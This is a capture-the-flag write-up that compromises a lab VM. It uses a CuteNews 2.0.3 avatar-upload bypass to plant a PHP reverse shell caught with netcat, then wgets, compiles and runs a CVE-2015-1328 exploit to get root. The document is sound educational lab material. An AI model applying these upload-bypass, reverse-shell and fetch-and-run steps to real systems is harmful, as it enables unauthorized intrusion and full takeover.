---
layout: post
title:  CTF simple CTF
date:   2022-03-02 18:20:52 -0600
categories: CTF
tags: Linux
---
# netdiscover

```sh
sudo netdiscover 
```
![](https://i.imgur.com/aXeWVbF.png)

192.168.0.27

# nmap
```sh
nmap -sV 192.168.0.27

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
```

# Port 80
http://192.168.0.27
![](https://i.imgur.com/cVxT6Q1.png)
As we can see it's running `CuteNews v.2.0.3`.
Les't see if I can exploit it.

https://www.exploit-db.com/exploits/37474

```txt
# Exploit  :
 
Vuln : http://127.0.0.1/cutenews/index.php?mod=main&opt=personal
  
 1 - Sign up for New User
 2 - Log In 
 3 - Go to Personal options http://www.target.com/cutenews/index.php?mod=main&opt=personal
 4 - Select Upload Avatar Example: Evil.jpg
 5 - use tamper data  & Rename File Evil.jpg to Evil.php
  
-----------------------------2847913122899\r\nContent-Disposition: form-data; name="avatar_file"; filename="Evil.php"\r\

6 - Your Shell : http://127.0.0.1/cutenews/uploads/avatar_Username_FileName.php

 Example: http://127.0.0.1/cutenews/uploads/avatar_toxic_Evil.php
```
I have to register first, I'm gonna use the name `user1`.
## Download the revershell

https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
You have to change the IP address and the port.
You have to put the IP address of your computer, I always use the port 4648.
Save the file as `rc.jpg`.

## Tamper data exploit

Open `burpsuit`.
Proxy -> intercept -> open browser:
go to this page: http://192.168.0.27/index.php?mod=main&opt=personal
You have to forward to send the Request.
Now send the file `rc.jpg` in the form.
![](https://i.imgur.com/b8cTM45.png)
Rename the file in `rc.php`.
![](https://i.imgur.com/XQeTVdA.png)
You can close burpsuit now.

## netcat
You have to listen with netcat.
```sh
nc -nlvp 4648
```
Now you can open the revers-shell.
![](https://i.imgur.com/7Xp0u8s.png)
Now I have a shell.
![](https://i.imgur.com/AGkiKPI.png)

# CVE-2015-1328
```sh
uname -a

Linux simple 3.16.0-30-generic #40~14.04.1-Ubuntu SMP Thu Jan 15 17:45:15 UTC 2015 i686 i686 i686 GNU/Linux
```
Let's go.
https://www.exploit-db.com/exploits/37292
I download the exploit on his computer in `/tmp`.
```sh
wget https://www.exploit-db.com/download/37292 -O exp.c
```
Then use gcc:
```sh
gcc exp.c -o ofs
```
And run it.
```sh
./ofs
```
I'm root

![](https://i.imgur.com/A5CDG2q.png)














